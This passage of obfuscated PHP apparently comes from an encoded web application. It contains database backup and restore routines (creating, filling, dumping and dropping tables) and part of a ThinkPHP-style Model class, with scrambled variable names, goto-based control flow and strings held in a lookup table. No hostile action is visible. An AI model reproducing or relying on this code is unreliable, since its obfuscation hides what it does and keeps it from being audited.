$c–ö™—èè[$døï°¨ñœ‡[748]]; $c–ö™—èè[$døï°¨ñœ‡[748]] = substr($EŸŠ„¥¬‚, 0, strrpos($EŸŠ„¥¬‚, $døï°¨ñœ‡[994])); } goto dğìÉä¨ìˆ; b‰÷øÜó×Ş: $this->database = $c–ö™—èè; $bè¨Ö¹–ğ->execute("\165\163\145\x20\140{$d·È†Ü·ñô}\140"); return $bè¨Ö¹–ğ; goto EÏõ“ÄÈ„Š; dğìÉä¨ìˆ: $this->database = $c–ö™—èè; $bè¨Ö¹–ğ = $this->model()->db(); try { $E•Àå¨œÕê = $bè¨Ö¹–ğ->execute("\x73\150\x6f\167\x20\144\141\x74\x61\x62\x61\163\145\x73\x20\x6c\x69\153\x65\40\47{$d·È†Ü·ñô}\x27"); } catch (Exception $bˆÑ–ÊÖùï) { } goto F„Ì‰Œ¼¬Ø; F„Ì‰Œ¼¬Ø: if (!$E•Àå¨œÕê) { $bè¨Ö¹–ğ->execute("\143\x72\145\x61\x74\x65\40\144\x61\x74\x61\x62\x61\163\145\40\140{$d·È†Ü·ñô}\x60"); } $c–ö™—èè[$døï°¨ñœ‡[906]] = $d·È†Ü·ñô; if ($c–ö™—èè[$døï°¨ñœ‡[746]] == $døï°¨ñœ‡[747]) { $c–ö™—èè[$døï°¨ñœ‡[748]] .= $døï°¨ñœ‡[994] . $d·È†Ü·ñô; } goto b‰÷øÜó×Ş; aÍ÷…‘ßÚˆ: $døï°¨ñœ‡ =& $_SERVER[¾÷]; $c–ö™—èè = array_change_key_case($this->database); if ($this->type == $døï°¨ñœ‡[19] || !$BéÀóÂáø×) { return $this->model()->db(); } goto eªœéŠğ°; EÏõ“ÄÈ„Š: } public function createTable($DÌ÷ßÔƒ³Ğ, $c¨Š£ãªá = null) { $f’ğ¬âÑõÍ =& $_SERVER[¾÷]; if (!IO::exist($DÌ÷ßÔƒ³Ğ)) { ActionCall($f’ğ¬âÑõÍ[995], !0, 0); show_json(LNG($f’ğ¬âÑõÍ[996]), !1); } $Eàö˜ÖŠÆ = sqlSplit(IO::getContent($DÌ÷ßÔƒ³Ğ)); foreach ($Eàö˜ÖŠÆ as $B¹ÜˆÔ»æï) { if ($c¨Š£ãªá) { $dœéÃ÷øï = stripos($B¹ÜˆÔ»æï, $f’ğ¬âÑõÍ[997]) === 0; if ($dœéÃ÷øï) { $c¨Š£ãªá->task[$f’ğ¬âÑõÍ[998]] += 1; } } $this->model()->db()->execute($B¹ÜˆÔ»æï); if ($c¨Š£ãªá && $dœéÃ÷øï) { preg_match($f’ğ¬âÑõÍ[999], $B¹ÜˆÔ»æï, $FšÚˆù±—·); $c¨Š£ãªá->task[$f’ğ¬âÑõÍ[1000]] = $FšÚˆù±—·[1]; $c¨Š£ãªá->update(1); } } $this->taskToCache($c¨Š£ãªá); } public function insertTable($c›’™·Ô­, $fµ‘‰êùÁÛ = null) { $F‡ÄÁ¿ç£È =& $_SERVER[¾÷]; $D‘«™ÀàØƒ = $this->model()->db(); $cÑËª†³î¹ = $FÂ¼±•»£ï ? array($FÂ¼±•»£ï) : $D‘«™ÀàØƒ->getTables(); foreach ($c›’™·Ô­ as $AÉ«•†Î£) { $FÂ¼±•»£ï = basename($AÉ«•†Î£, $F‡ÄÁ¿ç£È[739]); if (!in_array($FÂ¼±•»£ï, $cÑËª†³î¹)) { continue; } if ($fµ‘‰êùÁÛ) { $fµ‘‰êùÁÛ->task[$F‡ÄÁ¿ç£È[1000]] = $FÂ¼±•»£ï; } if (get_filesize($AÉ«•†Î£) == 0) { continue; } $AÛ½š›Ÿ = $this->sqlToDb($AÉ«•†Î£, $fµ‘‰êùÁÛ); if (!$AÛ½š›Ÿ) { ActionCall($F‡ÄÁ¿ç£È[995], !0, 0); show_json(LNG($F‡ÄÁ¿ç£È[1001]) . "\x5b{$FÂ¼±•»£ï}\x5d", !1); } } $this->taskToCache($fµ‘‰êùÁÛ); } public function sqlFromDb($d½·«ÅÁÏˆ, $bëªñØ²ªÚ, $e±¢–ÉãŠ× = null, $e÷ÑØÉ§´‡ = null) { goto eô³¸Ò¨å; b¸¶ø„ŒÌ: $C«ÂÔ½ŒÇ› = $d§Æ áÉÉ->getPk(); $dóŠô˜¢ô­ = $d§Æ áÉÉ->getDbFields(); do { $E—Úæˆì¶ = $d§Æ áÉÉ->field($dóŠô˜¢ô­)->order($C«ÂÔ½ŒÇ› . $_SERVER[¾÷][1003])->selectPage($d†³‚È²®‘, $eÎ¬Åôóå¨); $f‡¢£•ÖÈ˜ = isset($E—Úæˆì¶[$_SERVER[¾÷][371]][$_SERVER[¾÷][373]]) ? $E—Úæˆì¶[$_SERVER[¾÷][371]][$_SERVER[¾÷][373]] : 0; $b‹šò“µÙÁ = !empty($E—Úæˆì¶[$_SERVER[¾÷][374]]) ? $E—Úæˆì¶[$_SERVER[¾÷][374]] : array(); if (!($eĞâˆ°šäÀ = count($b‹šò“µÙÁ))) { break; } $a‡ÉÊªâ¶ = array(); foreach ($b‹šò“µÙÁ as $d³¼íì†Ö) { if ($d½·«ÅÁÏˆ == $_SERVER[¾÷][1004] && $d³¼íì†Ö[$_SERVER[¾÷][39]] == $_SERVER[¾÷][1005]) { $c°¶£“øË¤ = json_decode($d³¼íì†Ö[$_SERVER[¾÷][379]], !0); if ($c°¶£“øË¤[$_SERVER[¾÷][38]] == date($_SERVER[¾÷][712]) && !$c°¶£“øË¤[$_SERVER[¾÷][711]]) { continue; } } if ($e÷ÑØÉ§´‡) { $d³¼íì†Ö[$_SERVER[¾÷][85]] = "\x7b\151\157\72{$e÷ÑØÉ§´‡}\x7d" . substr($d³¼íì†Ö[$_SERVER[¾÷][85]], strlen("\173\151\157\x3a{$d³¼íì†Ö[$_SERVER[¾÷][769]]}\175")); $d³¼íì†Ö[$_SERVER[¾÷][769]] = $e÷ÑØÉ§´‡; } $a‡ÉÊªâ¶[] = $_SERVER[¾÷][1006] . $this->sqlEncode($d³¼íì†Ö) . $_SERVER[¾÷][1007]; } $A§ÏĞÓ®ê = "\x49\116\x53\x45\x52\x54\40\111\x4e\x54\x4f\x20\140{$d½·«ÅÁÏˆ}\x60\40\x28\140" . implode($_SERVER[¾÷][1008], $dóŠô˜¢ô­) . $_SERVER[¾÷][1009]; fwrite($Bí’ÊÃÎù®, $A§ÏĞÓ®ê . implode($_SERVER[¾÷][1010], $a‡ÉÊªâ¶) . $_SERVER[¾÷][77] . PHP_EOL); $eÎ¬Åôóå¨++; $dŒ™çˆ„†É += $eĞâˆ°šäÀ; if ($e±¢–ÉãŠ×) { $e±¢–ÉãŠ×->update($eĞâˆ°šäÀ); } } while ($eÎ¬Åôóå¨ <= $f‡¢£•ÖÈ˜); goto Eºš¬Ó÷äˆ; D¸Ùâò‡µ¡: $eÎ¬Åôóå¨ = 1; $d†³‚È²®‘ = 500; $Bí’ÊÃÎù® = fopen($bëªñØ²ªÚ, $_SERVER[¾÷][1002]); goto b¸¶ø„ŒÌ; eô³¸Ò¨å: if ($e±¢–ÉãŠ×) { $e±¢–ÉãŠ×->task[$_SERVER[¾÷][1000]] = $d½·«ÅÁÏˆ; } $d§Æ áÉÉ = $this->model($d½·«ÅÁÏˆ); $dŒ™çˆ„†É = 0; goto D¸Ùâò‡µ¡; Eºš¬Ó÷äˆ: fclose($Bí’ÊÃÎù®); return $dŒ™çˆ„†É; goto F±À‡À‚ÏÑ; F±À‡À‚ÏÑ: } public function sqlToDb($Bã…„ ‹™, $eìé”ªšïä = null) { goto D‡œ•ëÔÜä; a’âãÔ‘À: if (trim($BÆÁî•Â¬£)) { $BÆÁî•Â¬£ = rtrim(trim($BÆÁî•Â¬£), $D¦ùĞìéà›[77]); if (!$Dãç¾»»->execute($BÆÁî•Â¬£)) { return !1; } if ($eìé”ªšïä) { $eìé”ªšïä->update($D¤­Ò„ˆ’É - 1); } } return !0; goto b“ÒæÀ•â—; d¿èõ†ææ‘: $fæÚì»Ï³• = 500 + 1; while (!feof($dë—Î»Ø”)) { if ($eìé”ªšïä && $D¤­Ò„ˆ’É != 0) { $eìé”ªšïä->task[$D¦ùĞìéà›[998]] += 1; } $D¤­Ò„ˆ’É++; $DÙİä¶æ÷ï = trim(fgets($dë—Î»Ø”)); $BÆÁî•Â¬£ .= $D¦ùĞìéà›[60] . $this->sqlDecode($DÙİä¶æ÷ï, $this->type); if ($D¤­Ò„ˆ’É == $fæÚì»Ï³•) { $BÆÁî•Â¬£ = rtrim(trim($BÆÁî•Â¬£), $D¦ùĞìéà›[77]); if (!$Dãç¾»»->execute($BÆÁî•Â¬£)) { return !1; } if ($eìé”ªšïä) { $eìé”ªšïä->update($D¤­Ò„ˆ’É - 1); } $BÆÁî•Â¬£ = $D¦ùĞìéà›[43]; $D¤­Ò„ˆ’É = 0; } } fclose($dë—Î»Ø”); goto a’âãÔ‘À; D‡œ•ëÔÜä: $D¦ùĞìéà› =& $_SERVER[¾÷]; $Dãç¾»» = $this->model()->db(); $dë—Î»Ø” = @fopen($Bã…„ ‹™, $D¦ùĞìéà›[1011]); goto DĞ×ˆø¡›; DĞ×ˆø¡›: if (!$dë—Î»Ø”) { return !1; } $D¤­Ò„ˆ’É = 0; $BÆÁî•Â¬£ = $D¦ùĞìéà›[43]; goto d¿èõ†ææ‘; b“ÒæÀ•â—: } public function dropTable($Bâ„ª†¼ = null) { $A©¯¡ê¢‹Ÿ = $this->model()->db(); $b–“åçÔƒ¬ = $Bâ„ª†¼ ? array($Bâ„ª†¼) : $A©¯¡ê¢‹Ÿ->getTables(); if (!$b–“åçÔƒ¬) { return; } foreach ($b–“åçÔƒ¬ as $Bâ„ª†¼) { $A©¯¡ê¢‹Ÿ->execute("\x64\162\157\x70\40\164\x61\x62\x6c\x65\40\151\146\40\145\170\151\x73\x74\x73\x20\x60{$Bâ„ª†¼}\x60"); } } private function taskToCache($Eó‡Š·Ş¨ = null) { $e‘Óõ——± =& $_SERVER[¾÷]; if (!$Eó‡Š·Ş¨) { return; } $dĞÊØâì† = array($e‘Óõ——±[1000] => $Eó‡Š·Ş¨->task[$e‘Óõ——±[1000]], $e‘Óõ——±[998] => $Eó‡Š·Ş¨->task[$e‘Óõ——±[998]], $e‘Óõ——±[1012] => $Eó‡Š·Ş¨->task[$e‘Óõ——±[1012]]); if ($dĞÊØâì†[$e‘Óõ——±[998]] == $dĞÊØâì†[$e‘Óõ——±[1012]]) { $dĞÊØâì†[$e‘Óõ——±[718]] = 1; } Cache::set($e‘Óõ——±[1013] . $Eó‡Š·Ş¨->task[$e‘Óõ——±[397]], $dĞÊØâì†); $Eó‡Š·Ş¨->end(); } private function sqlEncode($B×êêŸõß) { $bÇóë·…êŠ =& $_SERVER[¾÷]; $bö™œÂ¿Ùä = array(); foreach ($B×êêŸõß as $dÎ÷ÚÇÒ¤) { if (is_array($dÎ÷ÚÇÒ¤)) { $dÎ÷ÚÇÒ¤ = json_encode_force($dÎ÷ÚÇÒ¤); } $dÎ÷ÚÇÒ¤ = addslashes($dÎ÷ÚÇÒ¤); $dÎ÷ÚÇÒ¤ = str_replace(array($bÇóë·…êŠ[1014], $bÇóë·…êŠ[9]), array($bÇóë·…êŠ[1015], $bÇóë·…êŠ[1016]), $dÎ÷ÚÇÒ¤); $bö™œÂ¿Ùä[] = str_replace($bÇóë·…êŠ[65], $bÇóë·…êŠ[1017], $dÎ÷ÚÇÒ¤); } return $bÇóë·…êŠ[65] . implode($bÇóë·…êŠ[1018], $bö™œÂ¿Ùä) . $bÇóë·…êŠ[65]; } private function sqlDecode($f‰¤ìÛ›¸·, $dï—ÀË¿¡) { $a‚ÍëÒ²Õ =& $_SERVER[¾÷]; $f‰¤ìÛ›¸· = str_replace(array($a‚ÍëÒ²Õ[1015], $a‚ÍëÒ²Õ[1016]), array($a‚ÍëÒ²Õ[1014], $a‚ÍëÒ²Õ[9]), $f‰¤ìÛ›¸·); if ($dï—ÀË¿¡ == $a‚ÍëÒ²Õ[19]) { $f‰¤ìÛ›¸· = stripslashes($f‰¤ìÛ›¸·); } return $f‰¤ìÛ›¸·; } } goto cÖÇšØôŞ; b´®öÄì: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\154\x65", "\157\x72\144\x65\162", "\x61\x6c\x69\141\163", "\150\x61\x76\x69\156\147", "\x67\x72\x6f\165\160", "\154\157\x63\x6b", "\144\151\x73\x74\x69\x6e\x63\164", "\x61\x75\164\157", "\146\151\154\164\145\162", "\166\141\154\x69\144\141\164\145", "\x72\x65\x73\x75\154\x74", "\142\151\x6e\x64", "\x74\157\x6b\x65\x6e"); public function __construct($FŸ·­ôâì— = '', $B•ÃÔ˜ª¶‚ = '', $e‡®ÇËÄì = '') { $C ¤Ô¬Ï§ª =& $_SERVER[¾÷]; $this->_initialize(); if (!empty($FŸ·­ôâì—)) { if (strpos($FŸ·­ôâì—, $C ¤Ô¬Ï§ª[104])) { list($this->dbName, $this->name) = explode($C ¤Ô¬Ï§ª[104], $FŸ·­ôâì—); } else { $this->name = $FŸ·­ôâì—; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($B•ÃÔ˜ª¶‚)) { $this->tablePrefix = $C ¤Ô¬Ï§ª[43]; } elseif ($C ¤Ô¬Ï§ª[43] != $B•ÃÔ˜ª¶‚) { $this->tablePrefix = $B•ÃÔ˜ª¶‚; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($C ¤Ô¬Ï§ª[249]); } $this->db(0, empty($this->connection) ? $e‡®ÇËÄì : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $e±¼ÖäŒÑ‹ =& $_SERVER[¾÷]; if (empty($this->fields)) { if (think_config($e±¼ÖäŒÑ‹[250])) { $fù“ÀêÚèò = $this->dbName ? $this->dbName : think_config($e±¼ÖäŒÑ‹[251]); $f‰êö”©¦ = think_var_cache($e±¼ÖäŒÑ‹[252] . strtolower(get_path_this($fù“ÀêÚèò) . $e±¼ÖäŒÑ‹[104] . $this->name)); if ($f‰êö”©¦) { $EØÅ“ÍÀ‰õ = think_config($e±¼ÖäŒÑ‹[253]); if (empty($EØÅ“ÍÀ‰õ) || $f‰êö”©¦[$e±¼ÖäŒÑ‹[254]] == $EØÅ“ÍÀ‰õ) { $this->fields = $f‰êö”©¦; return; } } } $this->flush(); } } public function flush() { goto e•™Šéô„Ö; aÔ©³‡¼º™: if (!$fš¦¤í‘Œß) { return !1; } $this->fields = array_keys($fš¦¤í‘Œß); $this->fields[$AŞœá‰¦ï¹[255]] = !1; goto e›”‘·´ñŒ; e›”‘·´ñŒ: foreach ($fš¦¤í‘Œß as $AÌòæ¶Ü¸ => $cï’‚½è¢×) { $dŞÆ¾¥í†ï[$AÌòæ¶Ü¸] = $cï’‚½è¢×[$AŞœá‰¦ï¹[39]]; if ($cï’‚½è¢×[$AŞœá‰¦ï¹[46]]) { $this->fields[$AŞœá‰¦ï¹[256]] = $AÌòæ¶Ü¸; if ($cï’‚½è¢×[$AŞœá‰¦ï¹[49]]) { $this->fields[$AŞœá‰¦ï¹[255]] = !0; } } } $this->fields[$AŞœá‰¦ï¹[257]] = $dŞÆ¾¥í†ï; if (think_config($AŞœá‰¦ï¹[253])) { $this->fields[$AŞœá‰¦ï¹[254]] = think_config($AŞœá‰¦ï¹[253]); } goto aİĞÌù»¾Û; aİĞÌù»¾Û: if (think_config($AŞœá‰¦ï¹[250])) { $fõõîï¡„ = $this->dbName ? $this->dbName : think_config($AŞœá‰¦ï¹[251]); think_var_cache($AŞœá‰¦ï¹[252] . strtolower(get_path_this($fõõîï¡„) . $AŞœá‰¦ï¹[104] . $this->name), $this->fields); } goto bÜ½½ÈÎÍ; e•™Šéô„Ö: $AŞœá‰¦ï¹ =& $_SERVER[¾÷]; $this->db->setModel($this->name); $fš¦¤í‘Œß = $this->db->getFields($this->getTableName()); goto aÔ©³‡¼º™; bÜ½½ÈÎÍ: } public function switchModel($a¨èÙŸá ì, $aô®ĞéÛ = array()) { $Aß…Ê’Âå» =& $_SERVER[¾÷]; $cŞÃôƒåÅñ = ucwords(strtolower($a¨èÙŸá ì)) . $Aß…Ê’Âå»[258]; if (!class_exists($cŞÃôƒåÅñ)) { think_exception($cŞÃôƒåÅñ . think_lang($Aß…Ê’Âå»[259])); } $this->_extModel = new $cŞÃôƒåÅñ($this->name); if (!empty($aô®ĞéÛ)) { foreach ($aô®ĞéÛ as $añÛ¨ªº÷) { $this->_extModel->setProperty($añÛ¨ªº÷, $this->{$añÛ¨ªº÷}); } } return $this->_extModel; } public function __set($cÖÈóºöÂˆ, $FÛÅ²ÊÅœ´) { $this->data[$cÖÈóºöÂˆ] = $FÛÅ²ÊÅœ´; } public function __get($F‘¿å¯À¨) { return isset($this->data[$F‘¿å¯À¨]) ? $this->data[$F‘¿å¯À¨] : null; } public function __isset($dÌö‹Ñ¾) { return isset($this->data[$dÌö‹Ñ¾]); } public function __unset($fİ‰ÔÍŠåÑ) { unset($this->data[$fİ‰ÔÍŠåÑ]); } public function __call($EËÍ–ÏÎô’, $BÕˆ³¤Œâå) { $Fø’‰áÌ‘‡ =& $_SERVER[¾÷]; if (in_array(strtolower($EËÍ–ÏÎô’), $this->methods, !0)) { $this->options[strtolower($EËÍ–ÏÎô’)] = $BÕˆ³¤Œâå[0]; return $this; } elseif (in_array(strtolower($EËÍ–ÏÎô’), array($Fø’‰áÌ‘‡[260], $Fø’‰áÌ‘‡[261], $Fø’‰áÌ‘‡[262], $Fø’‰áÌ‘‡[263], $Fø’‰áÌ‘‡[264]), !0)) { $cÜ²ÅÕ¦ = isset($BÕˆ³¤Œâå[0]) ? $BÕˆ³¤Œâå[0] : $Fø’‰áÌ‘‡[191]; $cÜ²ÅÕ¦ = $this->db->parseKey($cÜ²ÅÕ¦); return $this->getField(strtoupper($EËÍ–ÏÎô’) . $Fø’‰áÌ‘‡[265] . $cÜ²ÅÕ¦ . $Fø’‰áÌ‘‡[266] . $EËÍ–ÏÎô’, $Fø’‰áÌ‘‡[260]); } elseif (strtolower(substr($EËÍ–ÏÎô’, 0, 5)) == $Fø’‰áÌ‘‡[267]) { $cÜ²ÅÕ¦ = think_parse_name(substr($EËÍ–ÏÎô’, 5)); $dŸÔ§ŞŸ§[$cÜ²ÅÕ¦] = $BÕˆ³¤Œâå[0]; return $this->where($dŸÔ§ŞŸ§)->find(); } elseif (strtolower(substr($EËÍ–ÏÎô’, 0, 10)) == $Fø’‰áÌ‘‡[268]) { $CŒ’šì å’ = think_parse_name(substr($EËÍ–ÏÎô’, 10)); $dŸÔ§ŞŸ§[$CŒ’šì å’] = $BÕˆ³¤Œâå[0]; return $this->where($dŸÔ§ŞŸ§)->getField($BÕˆ³¤Œâå[1]); } elseif (isset($this->_scope[$EËÍ–ÏÎô’])) { return $this->scope($EËÍ–ÏÎô’, $BÕˆ³¤Œâå[0]); } elseif (method_exists($this, $EËÍ–ÏÎô’)) { array_unshift($BÕˆ³¤Œâå, $EËÍ–ÏÎô’); return call_user_func_array(array($this, $Fø’‰áÌ‘‡[269]), $BÕˆ³¤Œâå); } else { return call_user_func_array(array(parent, $EËÍ–ÏÎô’), $BÕˆ³¤Œâå); } } protected function call() { goto Føª¹çöµ; A½ ÎÊ×õ‘: if (isset($C¹à³Ú®ª[$a³ê‚ÂæÅò]) && $C¹à³Ú®ª[$a³ê‚ÂæÅò] === $d³ˆÚæâ‡—) { think_exception(__CLASS__ . $B‘èÉÙ²ƒ÷[14] . $d³ˆÚæâ‡— . think_lang($B‘èÉÙ²ƒ÷[270])); return; } $C¹à³Ú®ª[] = $d³ˆÚæâ‡—; if (method_exists($this, $B‘èÉÙ²ƒ÷[271])) { $b¾©ë¿Æ°© = call_user_func_array(array($this, $B‘èÉÙ²ƒ÷[272]), array($d´ÄŒ…‡öŞ, $C¹à³Ú®ª)); if (!is_null($b¾©ë¿Æ°©) && $b¾©ë¿Æ°© !== !1) { return $b¾©ë¿Æ°©; } } goto d†ÓÆ‹¡‹; Cº‡Şñ×‡: $d´ÄŒ…‡öŞ = $d³ˆÚæâ‡—; if (is_array($d³ˆÚæâ‡—)) { $d´ÄŒ…‡öŞ = $d³ˆÚæâ‡—[1]; $d³ˆÚæâ‡— = $d³ˆÚæâ‡—[0]; } $a³ê‚ÂæÅò = count($C¹à³Ú®ª) - 1; goto A½ ÎÊ×õ‘; Føª¹çöµ: $B‘èÉÙ²ƒ÷ =& $_SERVER[¾÷]; $C¹à³Ú®ª = func_get_args(); $d³ˆÚæâ‡— = array_shift($C¹à³Ú®ª); goto Cº‡Şñ×‡; d†ÓÆ‹¡‹: $C—ÕŒí°„Á = call_user_func_array(array($this, $d³ˆÚæâ‡—), $C¹à³Ú®ª); if (method_exists($this, $B‘èÉÙ²ƒ÷[273])) { $b¾©ë¿Æ°© = call_user_func_array(array($this, $B‘èÉÙ²ƒ÷[274]), array($d´ÄŒ…‡öŞ, $C¹à³Ú®ª, $C—ÕŒí°„Á)); if ($b¾©ë¿Æ°©) { return $b¾©ë¿Æ°©; } } return $C—ÕŒí°„Á; goto CéÅøõà; CéÅøõà: } protected function _initialize() { } protected function _facade($dÈ­‰³Œ™Ü) { $bß‚áøİµ =& $_SERVER[¾÷]; if (!empty($this->fields)) { foreach ($dÈ­‰³Œ™Ü as $Cˆ¶áğ£Ä => $Dˆ‚­™ì„‹) { if (is_array($this->fields) && !in_array($Cˆ¶áğ£Ä, $this->fields, !0)) { unset($dÈ­‰³Œ™Ü[$Cˆ¶áğ£Ä]); } elseif (is_scalar($Dˆ‚­™ì„‹)) { $this->_parseType($dÈ­‰³Œ™Ü, $Cˆ¶áğ£Ä); } } } if (!empty($this->options[$bß‚áøİµ[275]])) { $dÈ­‰³Œ™Ü = array_map($this->options[$bß‚áøİµ[275]], $dÈ­‰³Œ™Ü); unset($this->options[$bß‚áøİµ[275]]); } $this->_beforeWrite($dÈ­‰³Œ™Ü); return $dÈ­‰³Œ™Ü; } protected function _beforeWrite(&$Eçˆ©¹‰‹Á) { } public function add($b²îÜÆÂ¬ = '', $e¤íá«ÂìÏ = array(), $e×âÃëŒç = false) { goto DåŒ¯ö¨ºñ; c¢äÂƒË§: return $e©õš¼½İ×; goto EçºŸá¨ËÙ; DåŒ¯ö¨ºñ: if (empty($b²îÜÆÂ¬)) { if (!empty($this->data)) { $b²îÜÆÂ¬ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¾÷][276]); return !1; } } $e¤íá«ÂìÏ = $this->_parseOptions($e¤íá«ÂìÏ); $b²îÜÆÂ¬ = $this->_facade($b²îÜÆÂ¬); goto cÁò“Ñ†¥Œ; cÁò“Ñ†¥Œ: if (!1 === $this->_beforeInsert($b²îÜÆÂ¬, $e¤íá«ÂìÏ)) { return !1; } $e©õš¼½İ× = $this->db->insert($b²îÜÆÂ¬, $e¤íá«ÂìÏ, $e×âÃëŒç); if (!1 !== $e©õš¼½İ×) { $BèÑÊÜó°¢ = $this->getLastInsID(); if ($BèÑÊÜó°¢) { $b²îÜÆÂ¬[$this->getPk()] = $BèÑÊÜó°¢; $this->_after_insert($b²îÜÆÂ¬, $e¤íá«ÂìÏ); return $BèÑÊÜó°¢; } $this->_after_insert($b²îÜÆÂ¬, $e¤íá«ÂìÏ); } goto c¢äÂƒË§; EçºŸá¨ËÙ: } protected function _beforeInsert(&$Dé¿ÁÅŞÙÃ, $cà‡Øï‚´) { } protected function _after_insert($BÆä¶È¾±—, $E¸™¹¾‘Òà) { } public function addAll($F‰×ƒÕ®Ç, $A¹÷õßÄÌÜ = array(), $CÅõäæª» = false) { goto AçÈòÚ‚ÃÀ; b—‚¸“‰§Š: foreach ($F‰×ƒÕ®Ç as $c³ÓÅ¸­†â => $cùÆƒİÑ) { $F‰×ƒÕ®Ç[$c³ÓÅ¸­†â] = $this->_facade($cùÆƒİÑ); } if (method_exists($this->db, $B©ˆæà·÷[277])) { $B”ªÀÎ©ÊÁ = $this->db->insertAll($F‰×ƒÕ®Ç, $A¹÷õßÄÌÜ, $CÅõäæª»); } else { $this->startTrans(); foreach ($F‰×ƒÕ®Ç as $c³ÓÅ¸­†â => $cùÆƒİÑ) { $B”ªÀÎ©ÊÁ = $this->db->insert($cùÆƒİÑ, $A¹÷õßÄÌÜ, $CÅõäæª»); } $this->commit(); } if (!1 !== $B”ªÀÎ©ÊÁ) { $aÌòÎĞáÌ = $this->getLastInsID(); if ($aÌòÎĞáÌ) { return $aÌòÎĞáÌ; } } goto D˜Åõ¡…Øš; D˜Åõ¡…Øš: return $B”ªÀÎ©ÊÁ; goto câ©ï»Ì¢; AçÈòÚ‚ÃÀ: $B©ˆæà·÷ =& $_SERVER[¾÷]; if (empty($F‰×ƒÕ®Ç)) { $this->error = think_lang($B©ˆæà·÷[276]); return !1; } $A¹÷õßÄÌÜ = $this->_parseOptions($A¹÷õßÄÌÜ); goto b—‚¸“‰§Š; câ©ï»Ì¢: } public function selectAdd($c·¾§ƒ¤Ã = '', $c™İ§Ç÷²” = '', $cÈƒÒñŒå = array()) { $CòÍì×ŸÉÎ =& $_SERVER[¾÷]; $cÈƒÒñŒå = $this->_parseOptions($cÈƒÒñŒå); if (!1 === ($A‹­öÕ§«¯ = $this->db->selectInsert($c·¾§ƒ¤Ã ? $c·¾§ƒ¤Ã : $cÈƒÒñŒå[$CòÍì×ŸÉÎ[278]], $c™İ§Ç÷²” ? $c™İ§Ç÷²” : $this->getTableName(), $cÈƒÒñŒå))) { $this->error = think_lang($CòÍì×ŸÉÎ[279]); return !1; } else { return $A‹­öÕ§«¯; } } public function save($AÑÆá¤åå = '', $aÆ‘ÙÖôÃ¯ = array()) { goto fÛ¶Å¡ç¿¿; Aöß±¯»ëö: if (!1 !== $Aæ…±×«¥ó) { if (isset($Aôœ¥™ë—)) { $AÑÆá¤åå[$e´­ë†îç] = $Aôœ¥™ë—; } $this->_afterUpdate($AÑÆá¤åå, $aÆ‘ÙÖôÃ¯); } return $Aæ…±×«¥ó; goto DÓ†£¿¯“; AöÉÈÙóÆ: $aÆ‘ÙÖôÃ¯ = $this->_parseOptions($aÆ‘ÙÖôÃ¯); $e´­ë†îç = $this->getPk(); if (!isset($aÆ‘ÙÖôÃ¯[$d…¶›ÎÛæ[280]])) { if (isset($AÑÆá¤åå[$e´­ë†îç])) { $Eï—¦ÍÆ‰Õ[$e´­ë†îç] = $AÑÆá¤åå[$e´­ë†îç]; $aÆ‘ÙÖôÃ¯[$d…¶›ÎÛæ[280]] = $Eï—¦ÍÆ‰Õ; unset($AÑÆá¤åå[$e´­ë†îç]); } else { $this->error = think_lang($d…¶›ÎÛæ[279]); return !1; } } goto DĞ·óÁò¯ô; fÛ¶Å¡ç¿¿: $d…¶›ÎÛæ =& $_SERVER[¾÷]; if (empty($AÑÆá¤åå)) { if (!empty($this->data)) { $AÑÆá¤åå = $this->data; $this->data = array(); } else { $this->error = think_lang($d…¶›ÎÛæ[276]); return !1; } } $AÑÆá¤åå = $this->_facade($AÑÆá¤åå); goto AöÉÈÙóÆ; DĞ·óÁò¯ô: if (is_array($aÆ‘ÙÖôÃ¯[$d…¶›ÎÛæ[280]]) && isset($aÆ‘ÙÖôÃ¯[$d…¶›ÎÛæ[280]][$e´­ë†îç])) { $Aôœ¥™ë— = $aÆ‘ÙÖôÃ¯[$d…¶›ÎÛæ[280]][$e´­ë†îç]; } if (!1 === $this->_beforeUpdate($AÑÆá¤åå, $aÆ‘ÙÖôÃ¯)) { return !1; } $Aæ…±×«¥ó = $this->db->update($AÑÆá¤åå, $aÆ‘ÙÖôÃ¯); goto Aöß±¯»ëö; DÓ†£¿¯“: } protected function _beforeUpdate(&$DÖ»î´ÁŠÇ, $d—´Î‰Ë¦ó) { } protected function _afterUpdate($fóÍİ…•Å, $Bˆè¶Æ˜Ç) { } public function delete($DŞˆœ…Ô‰¢ = array()) { goto Càáä…Êİø; eì¡®Ô³ç: if (is_numeric($DŞˆœ…Ô‰¢) || is_string($DŞˆœ…Ô‰¢)) { if (strpos($DŞˆœ…Ô‰¢, $aä³Â·¢¦á[57])) { $dÓšÃÛ¹Ö[$Fè‰±ˆÕÁ] = array($aä³Â·¢¦á[281], $DŞˆœ…Ô‰¢); } else { $dÓšÃÛ¹Ö[$Fè‰±ˆÕÁ] = $DŞˆœ…Ô‰¢; } $this->options[$aä³Â·¢¦á[280]] = $dÓšÃÛ¹Ö; } $DŞˆœ…Ô‰¢ = $this->_parseOptions(); if (is_array($DŞˆœ…Ô‰¢[$aä³Â·¢¦á[280]]) && isset($DŞˆœ…Ô‰¢[$aä³Â·¢¦á[280]][$Fè‰±ˆÕÁ])) { $böµ»‹ŸÏ° = $DŞˆœ…Ô‰¢[$aä³Â·¢¦á[280]][$Fè‰±ˆÕÁ]; } goto AéìĞó»—¡; Càáä…Êİø: $aä³Â·¢¦á =& $_SERVER[¾÷]; if (empty($DŞˆœ…Ô‰¢) && empty($this->options[$aä³Â·¢¦á[280]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $Fè‰±ˆÕÁ = $this->getPk(); goto eì¡®Ô³ç; AéìĞó»—¡: $dß‹Â±ØŠ = $this->db->delete($DŞˆœ…Ô‰¢); if (!1 !== $dß‹Â±ØŠ) { $c²©ö½ìå‘ = array(); if (isset($böµ»‹ŸÏ°)) { $c²©ö½ìå‘[$Fè‰±ˆÕÁ] = 